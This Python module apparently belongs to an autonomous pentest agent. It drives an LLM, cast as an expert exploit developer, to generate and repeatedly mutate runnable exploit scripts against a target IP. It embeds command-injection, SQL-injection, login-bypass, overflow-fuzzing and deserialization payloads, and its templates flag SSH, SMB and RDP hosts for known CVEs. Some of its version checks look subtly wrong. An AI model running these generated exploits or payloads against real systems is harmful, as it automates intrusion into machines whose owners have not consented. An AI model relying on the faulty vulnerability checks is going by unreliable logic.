"""Payload Crafter — adaptive exploit script generation using LLM + experience data.

Takes target context + ExperienceStore data and prompts the LLM to generate
or mutate a Python exploit script. Returns versioned script with metadata.

V2: Service-aware templates, CVE-driven few-shot prompting, intelligent LLM mutations.
"""

from __future__ import annotations

import hashlib
import json
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from tools.experience_store import ExperienceStore


@dataclass
class CraftedPayload:
    generation_id: str
    parent_id: str | None
    script: str
    mutation_strategy: str
    metadata: dict[str, Any] = field(default_factory=dict)
    confidence: float = 0.0


# ── Few-shot exploit examples for common vulnerability classes ────────────

_FEW_SHOT_EXAMPLES: dict[str, str] = {
    "command_injection": '''
# Example: Command Injection exploit for HTTP service
import sys, socket, urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80

def check_command_injection():
    """Test for command injection via common parameters."""
    payloads = ["; id", "| id", "`id`", "$(id)", "&& id", "\\nid"]
    for payload in payloads:
        try:
            encoded = urllib.parse.quote(payload)
            sock = socket.create_connection((TARGET, PORT), timeout=5)
            req = f"GET /ping?host=127.0.0.1{encoded} HTTP/1.0\\r\\nHost: {TARGET}\\r\\n\\r\\n"
            sock.sendall(req.encode())
            resp = sock.recv(4096).decode(errors="replace")
            sock.close()
            if "uid=" in resp or "gid=" in resp:
                print(f"[+] Command injection confirmed with payload: {payload}")
                print(f"    Response: {resp[:300]}")
                return True
        except Exception as e:
            continue
    print("[-] Command injection not detected")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_command_injection() else 1)
''',
    "sql_injection": '''
# Example: SQL Injection exploit
import sys, socket, urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80

def check_sqli():
    """Test for SQL injection using union/error/time techniques."""
    tests = [
        ("' OR '1'='1", "union bypass"),
        ("' UNION SELECT NULL--", "union select"),
        ("' AND SLEEP(5)--", "time-based"),
        ("' AND 1=CONVERT(int,@@version)--", "error-based"),
    ]
    for payload, technique in tests:
        try:
            encoded = urllib.parse.quote(payload)
            sock = socket.create_connection((TARGET, PORT), timeout=8)
            req = f"GET /product?id=1{encoded} HTTP/1.0\\r\\nHost: {TARGET}\\r\\n\\r\\n"
            sock.sendall(req.encode())
            resp = sock.recv(4096).decode(errors="replace")
            sock.close()
            if "error" in resp.lower() or "syntax" in resp.lower() or "mysql" in resp.lower():
                print(f"[+] Potential SQLi ({technique}): payload reflected error")
                return True
        except Exception:
            continue
    print("[-] No SQL injection detected")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_sqli() else 1)
''',
    "buffer_overflow": '''
# Example: Buffer Overflow exploit probe
import sys, socket, struct

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

def check_buffer_overflow():
    """Send increasingly large payloads to detect buffer overflow."""
    for size in [256, 512, 1024, 2048, 4096, 8192]:
        try:
            sock = socket.create_connection((TARGET, PORT), timeout=5)
            # Send length-prefixed payload
            payload = b"A" * size
            sock.sendall(struct.pack(">I", len(payload)) + payload)
            try:
                resp = sock.recv(1024)
                print(f"[*] {size} bytes -> {len(resp)} byte response")
            except socket.timeout:
                print(f"[!] No response at {size} bytes — possible crash (overflow)!")
                return True
            sock.close()
        except ConnectionResetError:
            print(f"[+] Connection reset at {size} bytes — buffer overflow confirmed!")
            return True
        except Exception as e:
            print(f"[-] Error at {size} bytes: {e}")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_buffer_overflow() else 1)
''',
    "auth_bypass": '''
# Example: Authentication Bypass exploit
import sys, socket, urllib.parse, json

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80

def check_auth_bypass():
    """Test common authentication bypass techniques."""
    bypasses = [
        {"username": "admin'--", "password": "anything"},
        {"username": "admin' OR '1'='1'--", "password": "anything"},
        {"username": "admin'/*", "password": "*/"},
        {"username": "administrator", "password": "' OR 1=1--"},
    ]
    for creds in bypasses:
        try:
            body = json.dumps(creds).encode()
            sock = socket.create_connection((TARGET, PORT), timeout=5)
            req = (
                f"POST /login HTTP/1.0\\r\\n"
                f"Host: {TARGET}\\r\\n"
                f"Content-Type: application/json\\r\\n"
                f"Content-Length: {len(body)}\\r\\n"
                f"\\r\\n"
            ).encode() + body
            sock.sendall(req)
            resp = sock.recv(4096).decode(errors="replace")
            sock.close()
            if "200" in resp.split("\\r\\n")[0] or "302" in resp.split("\\r\\n")[0]:
                print(f"[+] Auth bypass successful with: {creds}")
                return True
        except Exception:
            continue
    print("[-] Auth bypass not successful")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_auth_bypass() else 1)
''',
    "deserialize": '''
# Example: Deserialization attack probe
import sys, socket, base64, struct

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80

JAVA_SERIAL_MAGIC = bytes([0xac, 0xed, 0x00, 0x05])

def check_java_deserialize():
    """Send Java serialization magic bytes to detect deserialization endpoints."""
    gadget = JAVA_SERIAL_MAGIC + bytes([0x73, 0x72, 0x00, 0x05, 0x50, 0x72, 0x6f, 0x62, 0x65])
    encoded = base64.b64encode(gadget).decode()
    try:
        sock = socket.create_connection((TARGET, PORT), timeout=8)
        req = (
            f"POST /api/data HTTP/1.0\\r\\n"
            f"Host: {TARGET}\\r\\n"
            f"Content-Type: application/octet-stream\\r\\n"
            f"Content-Length: {len(gadget)}\\r\\n"
            f"\\r\\n"
        ).encode() + gadget
        sock.sendall(req)
        resp = sock.recv(4096).decode(errors="replace")
        sock.close()
        if "ClassNotFoundException" in resp or "InvalidClassException" in resp:
            print("[+] Java deserialization endpoint detected!")
            return True
    except Exception as e:
        print(f"[-] Deserialization probe error: {e}")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_java_deserialize() else 1)
''',
}

# ── Service-specific exploit templates ────────────────────────────────────

_SERVICE_TEMPLATES: dict[str, str] = {
    "ssh": '''
import sys, socket, struct

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 22

def probe_ssh():
    """Connect to SSH, capture banner, check for known vulnerable versions."""
    sock = socket.create_connection((TARGET, PORT), timeout=5)
    banner = sock.recv(256).decode(errors="replace").strip()
    print(f"[*] SSH Banner: {{banner}}")
    # Check version against known CVEs
    import re
    ver_match = re.search(r"OpenSS[_]?[Hh]?[._-]?(\\d+\\.\\d+(?:p\\d+)?)", banner)
    if ver_match:
        version = ver_match.group(1)
        print(f"[*] OpenSSH version: {{version}}")
        # CVE-2024-6387 (regreSSHion): < 4.4p1 or 8.5p1 <= ver < 9.8p1
        parts = version.replace("p", ".").split(".")
        major, minor = int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
        if (major < 4) or (major == 4 and minor < 4):
            print("[+] VULNERABLE to CVE-2024-6387 (regreSSHion)!")
            return True
        if major == 8 and minor >= 5 and (major < 9 or (major == 9 and minor < 8)):
            print("[+] VULNERABLE to CVE-2024-6387 (regreSSHion)!")
            return True
    sock.close()
    return False

if __name__ == "__main__":
    sys.exit(0 if probe_ssh() else 1)
''',
    "smb": '''
import sys, socket, struct

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 445

def probe_smb():
    """Send SMB negotiate protocol request to fingerprint version."""
    # SMBv2 negotiate header
    neg = bytes([
        0x00, 0x00, 0x00, 0x90,  # NetBIOS session
        0xff, 0x53, 0x4d, 0x42,  # SMB magic
        0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x48,
    ])
    try:
        sock = socket.create_connection((TARGET, PORT), timeout=5)
        sock.sendall(neg)
        resp = sock.recv(256)
        sock.close()
        if b"\\x72\\x00" in resp or b"SMB" in resp:
            print(f"[+] SMB response: {{resp.hex()[:100]}}")
            # Check for SMBv1 (MS17-010 EternalBlue)
            if b"\\x72\\x00" in resp[:4]:
                print("[!] SMBv1 detected — potentially vulnerable to MS17-010 (EternalBlue)!")
                return True
            print("[*] SMBv2+ detected")
            return True
    except Exception as e:
        print(f"[-] SMB probe error: {{e}}")
    return False

if __name__ == "__main__":
    sys.exit(0 if probe_smb() else 1)
''',
    "http": '''
import sys, socket, urllib.parse, json

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80

def probe_http():
    """Send HTTP request and analyze response headers for technology stack."""
    try:
        sock = socket.create_connection((TARGET, PORT), timeout=5)
        req = f"GET / HTTP/1.0\\r\\nHost: {{TARGET}}\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n"
        sock.sendall(req.encode())
        resp = sock.recv(4096).decode(errors="replace")
        sock.close()
        headers = resp.split("\\r\\n\\r\\n")[0] if "\\r\\n\\r\\n" in resp else resp[:500]
        print(f"[*] HTTP Response:\\n{{headers[:500]}}")
        # Technology fingerprinting
        tech = []
        if "Server:" in headers:
            for line in headers.split("\\r\\n"):
                if line.lower().startswith("server:"):
                    tech.append(line)
        if "X-Powered-By:" in headers:
            for line in headers.split("\\r\\n"):
                if line.lower().startswith("x-powered-by:"):
                    tech.append(line)
        if tech:
            print(f"[*] Technology: {{'; '.join(tech)}}")
        return True
    except Exception as e:
        print(f"[-] HTTP probe error: {{e}}")
    return False

if __name__ == "__main__":
    sys.exit(0 if probe_http() else 1)
''',
    "rdp": '''
import sys, socket, struct

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3389

def probe_rdp():
    """Send RDP Connection Request to fingerprint version."""
    # TPKT + x.224 CRQ + RDP Negotiation Request
    pkt = (
        b"\\x03\\x00\\x00\\x13"  # TPKT header
        b"\\x0e\\xe0\\x00\\x00\\x00\\x00\\x00"  # x.224
        b"\\x01\\x00\\x08\\x00\\x03\\x00\\x00\\x00"  # RDP Negotiation
    )
    try:
        sock = socket.create_connection((TARGET, PORT), timeout=5)
        sock.sendall(pkt)
        resp = sock.recv(256)
        sock.close()
        print(f"[+] RDP response: {{resp.hex()[:100]}}")
        if b"\\x03\\x00" in resp[:2]:
            print("[*] RDP service confirmed")
            # Check for CVE-2019-0708 (BlueKeep) — Windows 7/2008 R2
            if len(resp) < 50:
                print("[!] Short RDP response — potentially vulnerable to BlueKeep (CVE-2019-0708)!")
            return True
    except Exception as e:
        print(f"[-] RDP probe error: {{e}}")
    return False

if __name__ == "__main__":
    sys.exit(0 if probe_rdp() else 1)
''',
    "redis": '''
import sys, socket

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6379

def probe_redis():
    """Test for unauthenticated Redis access."""
    try:
        sock = socket.create_connection((TARGET, PORT), timeout=5)
        sock.sendall(b"INFO\\r\\n")
        resp = sock.recv(4096).decode(errors="replace")
        sock.close()
        if "redis_version" in resp:
            print("[+] UNAUTHENTICATED REDIS ACCESS!")
            for line in resp.split("\\r\\n")[:10]:
                print(f"    {{line}}")
            return True
        elif "NOAUTH" in resp:
            print("[*] Redis requires authentication")
        else:
            print(f"[*] Redis response: {{resp[:200]}}")
    except Exception as e:
        print(f"[-] Redis probe error: {{e}}")
    return False

if __name__ == "__main__":
    sys.exit(0 if probe_redis() else 1)
''',
    "default": '''
import sys, socket, struct, json

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80

def probe_service():
    """Generic service probe — connect, capture banner, analyze."""
    try:
        sock = socket.create_connection((TARGET, PORT), timeout=5)
        sock.settimeout(3)
        try:
            banner = sock.recv(1024)
            print(f"[*] Banner: {{banner[:200]}}")
        except socket.timeout:
            # No banner — send generic probe
            sock.sendall(b"HELP\\r\\n")
            try:
                resp = sock.recv(1024)
                print(f"[*] Response to HELP: {{resp[:200]}}")
            except socket.timeout:
                print("[*] No banner or HELP response — service may require specific protocol")
        sock.close()
        return True
    except ConnectionRefusedError:
        print(f"[-] Connection refused on {{TARGET}}:{{PORT}}")
    except Exception as e:
        print(f"[-] Probe error: {{e}}")
    return False

if __name__ == "__main__":
    sys.exit(0 if probe_service() else 1)
''',
}

# ── Vulnerability class to import mapping ─────────────────────────────────

_VULN_CLASS_IMPORTS: dict[str, str] = {
    "command_injection": "import sys, socket, urllib.parse, argparse",
    "sql_injection": "import sys, socket, urllib.parse, argparse",
    "buffer_overflow": "import sys, socket, struct, argparse",
    "auth_bypass": "import sys, socket, urllib.parse, json, argparse",
    "deserialize": "import sys, socket, base64, struct, argparse",
    "xss": "import sys, socket, urllib.parse, argparse",
    "ssrf": "import sys, socket, urllib.parse, urllib.request, argparse",
    "path_traversal": "import sys, socket, urllib.parse, argparse",
    "file_upload": "import sys, socket, json, argparse",
    "jwt": "import sys, socket, base64, json, hmac, hashlib, argparse",
    "ssti": "import sys, socket, urllib.parse, argparse",
    "race_condition": "import sys, socket, concurrent.futures, threading, time, argparse",
    "default": "import sys, socket, struct, json, argparse",
}

# Service -> default port, so the generator prompt doesn't hardcode port 80 for
# every service (Redis on 80 is nonsense). Used only as a fallback default in
# the prompt; the actual script must still accept --port.
_SERVICE_DEFAULT_PORTS: dict[str, int] = {
    "http": 80, "https": 443, "ssh": 22, "smb": 445, "rdp": 3389,
    "redis": 6379, "mysql": 3306, "postgresql": 5432, "mssql": 1433,
    "mongodb": 27017, "ftp": 21, "telnet": 23, "smtp": 25, "dns": 53,
    "ldap": 389, "winrm": 5985, "docker": 2375, "elasticsearch": 9200,
    "vnc": 5900, "snmp": 161, "ntp": 123,
}


class PayloadCrafter:
    """Generates and mutates Python exploit scripts based on target context.

    V2 improvements:
    - Service-specific exploit templates (SSH, SMB, HTTP, RDP, Redis, etc.)
    - CVE-aware LLM prompting with few-shot examples
    - Intelligent LLM-driven mutations (not just string replacements)
    - Proper library imports based on vulnerability class
    """

    def __init__(
        self,
        workspace: Path,
        experience_store: ExperienceStore | None = None,
        client: Any | None = None,
        model: str = "",
        semantic_memory: Any | None = None,
    ) -> None:
        self._workspace = workspace
        self._workspace.mkdir(parents=True, exist_ok=True)
        self._mutations_dir = workspace / "mutations"
        self._mutations_dir.mkdir(parents=True, exist_ok=True)
        self._experience = experience_store
        self._client = client
        self._model = model
        # Tier 1.1: optional SemanticMemoryManager for cross-mission lesson
        # recall. When wired, generate() folds similar past lessons into the
        # prompt alongside the Bayesian experience hints.
        self._semantic = semantic_memory

    # ── Generation ──────────────────────────────────────────────────────

    def generate(
        self,
        target_ip: str,
        service_name: str,
        version: str,
        os_hint: str,
        module_name: str,
        failure_output: str = "",
        cve_ids: list[str] | None = None,
        vuln_class: str = "",
    ) -> CraftedPayload:
        """Generate a fresh exploit script for the given target context.

        Args:
            target_ip: Target IP address
            service_name: Service name (ssh, smb, http, rdp, redis, etc.)
            version: Service version string
            os_hint: OS hint (windows, linux, unknown)
            module_name: Attack module name for context
            failure_output: Previous failure output for retry context
            cve_ids: Known CVE IDs for targeted exploit generation
            vuln_class: Vulnerability class (command_injection, sql_injection, etc.)
        """
        generation_id = f"gen-{int(time.time())}-{hashlib.sha256(f'{target_ip}:{module_name}'.encode()).hexdigest()[:8]}"

        # Query experience store for similar successes
        exp_hints = ""
        if self._experience is not None:
            sig = f"{service_name}:{version}:{os_hint}"
            confs = self._experience.get_all_confidences(sig)
            if confs:
                best_action, best_conf = max(confs.items(), key=lambda x: x[1])
                exp_hints = (
                    f"\nPAST EXPERIENCE: Similar targets had highest success with '{best_action}' "
                    f"(confidence {best_conf:.2f})."
                )

        # Tier 1.1: cross-mission semantic recall — find lessons learned against
        # similar target/service contexts on PRIOR engagements and fold them
        # into the generation prompt. Best-effort: a down Ollama just yields
        # fewer hints; it must never block generation.
        if self._semantic is not None:
            try:
                ctx_text = (
                    f"{service_name}:{version}:{os_hint} {module_name} "
                    f"{vuln_class} {' '.join(cve_ids or [])}"
                )
                similar = self._semantic.find_similar_lessons(
                    text=ctx_text, outcome="success", top_k=3
                )
                if similar:
                    lessons_block = "; ".join(
                        f"{s.get('action_type', '?')} on {s.get('target_signature', '?')} "
                        f"-> {s.get('outcome', '?')} (sim {s.get('similarity', 0):.2f})"
                        for s in similar
                    )
                    exp_hints += f"\nCROSS-MISSION LESSONS: {lessons_block}"
            except Exception as exc:  # pragma: no cover - never block generation on recall failure
                print(f"[Adaptive Exploits] find_similar_lessons failed: {exc}")

        script = self._build_script_from_template(
            target_ip=target_ip,
            service_name=service_name,
            version=version,
            os_hint=os_hint,
            module_name=module_name,
            failure_output=failure_output,
            exp_hints=exp_hints,
            cve_ids=cve_ids or [],
            vuln_class=vuln_class,
        )

        self._save_script(generation_id, script, parent_id=None, strategy="generate")

        return CraftedPayload(
            generation_id=generation_id,
            parent_id=None,
            script=script,
            mutation_strategy="generate",
            metadata={
                "target_ip": target_ip,
                "service_name": service_name,
                "version": version,
                "os_hint": os_hint,
                "module_name": module_name,
                "cve_ids": cve_ids or [],
                "vuln_class": vuln_class,
            },
            confidence=0.5,
        )

    # ── Mutation ────────────────────────────────────────────────────────

    def mutate(
        self,
        previous_payload: CraftedPayload,
        failure_output: str,
        strategy: str = "context_aware",
    ) -> CraftedPayload:
        """Mutate an existing script based on failure feedback.

        When LLM is available, uses intelligent mutation instead of string replacement.
        """
        generation_id = f"mut-{int(time.time())}-{hashlib.sha256(previous_payload.generation_id.encode()).hexdigest()[:8]}"

        mutated = self._apply_mutation(
            previous_payload.script,
            strategy=strategy,
            failure_output=failure_output,
            metadata=previous_payload.metadata,
        )

        self._save_script(generation_id, mutated, parent_id=previous_payload.generation_id, strategy=strategy)

        return CraftedPayload(
            generation_id=generation_id,
            parent_id=previous_payload.generation_id,
            script=mutated,
            mutation_strategy=strategy,
            metadata={
                **previous_payload.metadata,
                "failure_output": failure_output[:500],
                "mutation_strategy": strategy,
            },
            confidence=previous_payload.confidence * 0.9,
        )

    # ── Internal: Script building ─────────────────────────────────────

    def _build_script_from_template(
        self,
        target_ip: str,
        service_name: str,
        version: str,
        os_hint: str,
        module_name: str,
        failure_output: str,
        exp_hints: str,
        cve_ids: list[str],
        vuln_class: str,
    ) -> str:
        """Build a Python exploit script — LLM if available, else service-specific template."""
        # If an LLM client is available, use it to craft a targeted exploit
        if self._client is not None and self._model:
            return self._llm_generate_script(
                target_ip, service_name, version, os_hint, module_name,
                failure_output, exp_hints, cve_ids, vuln_class,
            )

        # Fallback: service-specific template
        svc_key = service_name.lower()
        template = _SERVICE_TEMPLATES.get(svc_key, _SERVICE_TEMPLATES["default"])
        return template.format(target_ip=target_ip)

    def _llm_generate_script(
        self,
        target_ip: str,
        service_name: str,
        version: str,
        os_hint: str,
        module_name: str,
        failure_output: str,
        exp_hints: str,
        cve_ids: list[str],
        vuln_class: str,
    ) -> str:
        """Use the LLM to generate a context-aware, CVE-targeted exploit script."""
        # Select relevant few-shot example
        few_shot = ""
        if vuln_class and vuln_class in _FEW_SHOT_EXAMPLES:
            few_shot = f"\nREFERENCE EXAMPLE ({vuln_class}):\n{_FEW_SHOT_EXAMPLES[vuln_class]}\n"

        # Select appropriate imports
        imports = _VULN_CLASS_IMPORTS.get(vuln_class, _VULN_CLASS_IMPORTS["default"])
        default_port = _SERVICE_DEFAULT_PORTS.get(service_name.lower(), 80)

        cve_context = ""
        if cve_ids:
            cve_context = f"\nTARGET CVEs: {', '.join(cve_ids)}\nGenerate an exploit SPECIFICALLY targeting these CVEs."

        retry_context = ""
        if failure_output:
            retry_context = (
                f"\nPREVIOUS ATTEMPT FAILED WITH:\n{failure_output[:600]}\n"
                "[truncated] - only the first 600 chars of the failure were shown."
                if len(failure_output) > 600
                else f"\nPREVIOUS ATTEMPT FAILED WITH:\n{failure_output}\n"
            )
            retry_context += (
                "Analyze the failure and fix the exploit. Common issues: wrong port, "
                "wrong protocol, firewall blocking, service not vulnerable, payload syntax error."
            )

        prompt = f"""You are an expert exploit developer. Write a COMPLETE, RUNNABLE Python 3 exploit script.

TARGET CONTEXT:
- Target IP: {target_ip}
- Service: {service_name}
- Version: {version}
- OS: {os_hint}
- Attack Module: {module_name}
- Vulnerability Class: {vuln_class or 'unknown'}
{cve_context}
{retry_context}
{exp_hints}
{few_shot}

REQUIREMENTS:
1. The script MUST be self-contained and runnable.
2. Use ONLY standard library: {imports}
3. Argument contract: accept the target as ``sys.argv[1]`` (bare positional) AND ``--target <ip>``
   via ``argparse.parse_known_args()`` (so the bare positional is tolerated). Accept ``--port <port>``
   with default {default_port} (the standard port for {service_name or 'this service'}). Do NOT hardcode
   port 80 for non-HTTP services.
4. Success/failure markers (print EXACTLY one of these, on its own line):
   - On success: ``COMPROMISE: <short description> target=<target_ip>`` (e.g. ``COMPROMISE: command_injection_confirmed target=10.0.0.5``)
   - On failure: ``VULN_NOT_CONFIRMED: <one-line reason>``
   These markers are parsed by the agent loop to classify the outcome -- do not omit or reword them.
5. Include a main() function and ``if __name__ == '__main__': sys.exit(main())``
6. The script must only ever connect to the target IP ({target_ip}). Do NOT connect to any other host.
7. Handle errors gracefully (timeouts, connection refused, etc.) -- print the VULN_NOT_CONFIRMED marker on any failure.
8. Return ONLY raw Python code -- NO markdown fences, NO explanations, NO prose before or after the code.
"""
        messages = [
            {
                "role": "system",
                "content": (
                    "You are an expert exploit developer. You write clean, working Python 3 "
                    "exploit scripts. You return ONLY raw Python code with no markdown fences. "
                    "Every script prints a canonical COMPROMISE: or VULN_NOT_CONFIRMED: marker "
                    "on its own line so the agent loop can classify the outcome. "
                    "You handle errors gracefully."
                ),
            },
            {"role": "user", "content": prompt},
        ]
        try:
            response = self._client.chat(self._model, messages=messages, stream=False)
            content = response.get("message", {}).get("content", "")
            # Strip markdown fences (handles ```python, ```py, ```python3, ``` etc.)
            content = content.strip()
            content = re.sub(r"^```\w*\s*", "", content)
            content = re.sub(r"\s*```$", "", content)
            result = content.strip()
            if not result or len(result) < 50:
                raise ValueError("LLM returned empty or too-short response")
            return result
        except Exception as exc:
            # Fallback to service template on LLM failure
            svc_key = service_name.lower()
            template = _SERVICE_TEMPLATES.get(svc_key, _SERVICE_TEMPLATES["default"])
            return f"# LLM generation failed: {exc}\n# Using service-specific template\n" + template.format(target_ip=target_ip)

    # ── Internal: Mutation logic ──────────────────────────────────────

    def _apply_mutation(
        self,
        script: str,
        strategy: str,
        failure_output: str,
        metadata: dict[str, Any] | None = None,
    ) -> str:
        """Apply a mutation strategy. Uses LLM for intelligent mutation when available."""
        # Try LLM-driven mutation first
        if self._client is not None and self._model and failure_output:
            llm_mutated = self._llm_mutate_script(script, strategy, failure_output, metadata)
            if llm_mutated and len(llm_mutated) > 100:
                return llm_mutated

        # Fallback: mechanical mutations
        if strategy == "parameter_tweak":
            script = script.replace("timeout=5", "timeout=10")
            script = script.replace("timeout=3", "timeout=8")
            script = script.replace("recv(1024)", "recv(4096)")
            script = script.replace("recv(256)", "recv(1024)")
            script += "\n# MUTATION: parameter_tweak (increased timeouts/buffers)\n"
        elif strategy == "encoding_change":
            if "base64" not in script:
                script = "import base64\n" + script
            script += "\n# MUTATION: encoding_change (payload encoding wrapper available)\n"
        elif strategy == "delivery_swap":
            script = script.replace('b"GET /', 'b"POST /')
            script = script.replace('"GET /', '"POST /')
            script += "\n# MUTATION: delivery_swap (GET -> POST)\n"
        elif strategy == "context_aware":
            script += (
                f"\n# MUTATION: context_aware\n"
                f"# Failure analysis: {failure_output[:300]}\n"
                f"# Consider: firewall rules, protocol mismatch, version incompatibility\n"
            )
        else:
            script += f"\n# MUTATION: {strategy}\n"
        return script

    def _llm_mutate_script(
        self,
        script: str,
        strategy: str,
        failure_output: str,
        metadata: dict[str, Any] | None = None,
    ) -> str | None:
        """Use LLM to intelligently mutate a failing exploit script."""
        meta = metadata or {}
        fail_trunc = failure_output[:800]
        fail_marker = "\n[truncated] - only the first 800 chars of the failure were shown." if len(failure_output) > 800 else ""
        script_trunc = script[:3000]
        script_marker = "\n[truncated] - only the first 3000 chars of the script were shown." if len(script) > 3000 else ""
        prompt = f"""You are an exploit developer. The following Python exploit script FAILED.

FAILURE OUTPUT:
{fail_trunc}{fail_marker}

MUTATION STRATEGY: {strategy}
TARGET: {meta.get('target_ip', 'unknown')}
SERVICE: {meta.get('service_name', 'unknown')}

CURRENT SCRIPT:
```python
{script_trunc}{script_marker}
```

Analyze WHY it failed based on the output, then produce a FIXED version.
Common fixes:
- parameter_tweak: adjust timeouts, buffer sizes, retry counts
- encoding_change: URL-encode payloads, use base64, try different char encodings
- delivery_swap: change HTTP method, add/remove headers, change Content-Type
- context_aware: adapt to OS/service version specifics from failure output

CONSTRAINTS on the fixed script:
1. It MUST only ever connect to the target IP ({meta.get('target_ip', 'the assigned target')}). Do NOT connect to any other host.
2. It MUST print one canonical marker on its own line:
   - On success: ``COMPROMISE: <short description> target={meta.get('target_ip', '<target>')}``
   - On failure: ``VULN_NOT_CONFIRMED: <one-line reason>``
   Do NOT use [+] EXPLOIT SUCCESS or [-] EXPLOIT FAILED -- use the canonical markers only.
3. Keep the argument contract: ``sys.argv[1]`` bare positional AND ``--target <ip>`` via ``argparse.parse_known_args()``, plus ``--port <port>``.

Return ONLY the complete fixed Python script. NO markdown fences, NO explanations, NO prose before or after the code.
"""
        try:
            messages = [
                {"role": "system", "content": "You fix broken exploit scripts. Return ONLY raw Python code. The fixed script must print a COMPROMISE: or VULN_NOT_CONFIRMED: marker on its own line."},
                {"role": "user", "content": prompt},
            ]
            response = self._client.chat(self._model, messages=messages, stream=False)
            content = response.get("message", {}).get("content", "")
            content = content.strip()
            # Strip markdown fences (handles ```python, ```py, ```python3, ``` etc.)
            content = re.sub(r"^```\w*\s*", "", content)
            content = re.sub(r"\s*```$", "", content)
            result = content.strip()
            if result and len(result) > 100:
                return result
        except Exception as exc:
            # Log so a persistent LLM failure is debuggable instead of silently
            # degrading to mechanical mutation on every call.
            print(f"[PayloadCrafter] LLM mutation failed: {exc}")
        return None

    def _save_script(self, generation_id: str, script: str, parent_id: str | None, strategy: str) -> None:
        path = self._mutations_dir / f"{generation_id}.py"
        metadata = {
            "generation_id": generation_id,
            "parent_id": parent_id,
            "strategy": strategy,
            "timestamp": time.time(),
        }
        content = f"# METADATA: {json.dumps(metadata)}\n{script}"
        path.write_text(content, encoding="utf-8")
